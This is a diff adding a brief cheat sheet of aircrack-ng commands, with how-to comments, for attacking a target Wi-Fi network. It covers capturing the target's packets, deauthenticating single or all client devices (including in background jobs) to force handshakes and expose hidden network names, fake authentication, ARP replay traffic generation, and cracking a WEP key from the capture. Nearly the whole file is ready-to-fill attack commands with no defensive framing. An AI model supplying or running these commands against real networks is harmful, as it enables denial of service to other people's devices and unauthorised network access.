@@ -1,0 +1,23 @@
+# usually running in a seperate terminal to record target packets and keep focus
+airodump-ng --bssid [target bssid] --channel [target channel] --write [.cap] wlan0
+
+# disconnect packets to force reconnect, can see hidden wifi name, wait for handshake
+aireplay-ng --deauth [packets number] -a [bssid] -c [device mac] wlan0
+
+# disconnect multiple device in one terminal without showing packets 
+# "jobs" to check progress, "kill %1" to kill only job 1, "killall aireplay-ng" to kill all aireplay jobs
+aireplay-ng --deauth [packets number] -a [bssid] -c [device1 mac] wlan0 &> /dev/null &
+aireplay-ng --deauth [packets number] -a [bssid] -c [device2 mac] wlan0 &> /dev/null &
+
+# disconnect all devices of target wifi
+aireplay-ng --deauth [packets number] -a [bssid] wlan0
+
+
+# fake associate with target wifi
+aireplay-ng --fakeauth 0 -a [bssid] -h [own mac] wlan0
+
+# arp replay, wait for a while and keep it, it will keep generating arp packets
+aireplay-ng --arpreplay -b [bssid] -h [connected mac] wlan0
+
+# crack ska, WEP, the key is the letters and numbers after removing :
+aircrack-ng [.cap]
